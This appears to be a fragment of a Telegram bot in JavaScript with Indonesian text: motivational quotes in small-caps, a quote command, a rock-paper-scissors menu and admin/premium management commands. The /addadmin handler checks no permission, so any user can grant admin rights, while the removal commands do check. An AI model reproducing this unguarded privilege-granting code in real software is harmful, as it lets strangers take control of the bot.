"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
"ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴜꜱᴜʟ ᴊɪᴋᴀ ᴛᴇᴋᴀᴅ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ ᴄᴜᴋᴜᴘ ᴋᴜᴀᴛ."
];

// Command: /quotesgalau
bot.onText(/^\/motivasi$/, (msg) => {
    const chatId = msg.chat.id;

    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    const bacotan = pickRandom(motivasi);
    bot.sendMessage(chatId, bacotan);
});        

// Command /suit
bot.onText(/^\/suit$/, async (msg) => {
  const chatId = msg.chat.id;
  const userName = msg.from.first_name || "Pengguna";

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🪨 Batu", callback_data: "suit_batu" },
          { text: "✂️ Gunting", callback_data: "suit_gunting" },
          { text: "📄 Kertas", callback_data: "suit_kertas" },
        ],
      ],
    },
  };

  await bot.sendMessage(chatId, `👊 Hai ${userName}! Pilih tanganmu untuk bermain suit:`, options);
});
//=====================================
// === COMMAND ===
//colong adp

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});